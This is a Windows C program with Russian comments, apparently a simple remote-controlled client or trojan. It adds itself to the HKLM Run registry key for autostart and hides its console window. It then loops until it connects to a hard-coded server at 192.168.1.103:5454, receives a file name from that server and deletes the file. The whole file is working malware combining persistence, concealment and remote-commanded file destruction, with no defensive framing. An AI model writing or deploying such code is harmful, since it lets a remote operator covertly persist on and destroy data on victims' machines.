#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <stdio.h>
#include <winsock2.h>
#include <stdlib.h>
#include <dos.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT 5454
#define IP "192.168.1.103" //IP сервера 


int zapusk() {
    DWORD path = 0;
    TCHAR IpFilename[MAX_PATH];
    HKEY hKey;
    if ((path = GetModuleFileName(NULL, IpFilename, MAX_PATH)) == 0)///получение пути до программы
    {
        printf("Error1\n");
        return EXIT_FAILURE;
    }
    if (RegOpenKey(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), &hKey) != ERROR_SUCCESS)///открытие раздела реестра 
    {
        printf("Error2\n");
        return EXIT_FAILURE;
    }
    DWORD pathLen = path * sizeof(*IpFilename);
    if (RegSetValueEx(hKey, TEXT("CLIENT_CLIENT"), 0, REG_SZ, (LPBYTE)IpFilename, pathLen) != ERROR_SUCCESS)///добавление значения в реестр
    {
        printf("Error33\n");
        RegCloseKey(hKey);
        return EXIT_FAILURE;
    }
    RegCloseKey(hKey);
    return EXIT_SUCCESS;
}

int main() {
    if (zapusk() == EXIT_FAILURE)//автозапуск
    {
        return -1;
    }
    HWND hWnd = GetConsoleWindow();///скрытие окна
    ShowWindow(hWnd, SW_HIDE);
    WSADATA start; // структура для хранения информации о конкретной реализации интерфейса Windows Sockets
    WORD DLLVersion = MAKEWORD(2, 2);
    if (WSAStartup(DLLVersion, &start)) // Функция WSAStartup инициализирует WinSock
        return -1;
    SOCKET sp = socket(AF_INET, SOCK_STREAM, 0); // создание сокета, AF_INET для протокола  IP, для передачи данных через канал связи с TCP
    if (sp == INVALID_SOCKET) {
        printf("Invalid socket\n");
        return;
    }
    SOCKADDR_IN str;// Структура sockaddr_in описывает сокет для работы с протоколами IP
    memset(&str, 0, sizeof(str));///заполнение нулями
    str.sin_family = AF_INET;//указываем что работаем только с адресами типа Ipv4
    str.sin_port = htons(PORT);///номер порта который намерен занять процесс
    str.sin_addr.S_un.S_addr = inet_addr(IP); //IP адрес к которому будет привязан сокет
    while (connect(sp, &str, sizeof(str))) {//ожидание подключения
        Sleep(10);
        continue;
    }
    char filename[100];
    memset(filename, 0, sizeof(filename));
    recv(sp, filename, sizeof(filename), 0);///Функция служит для чтения данных из сокета
    if (_unlink(filename))///удаление
    {
        printf("File error!\n");
        return -1;
    }
    return EXIT_SUCCESS;
}
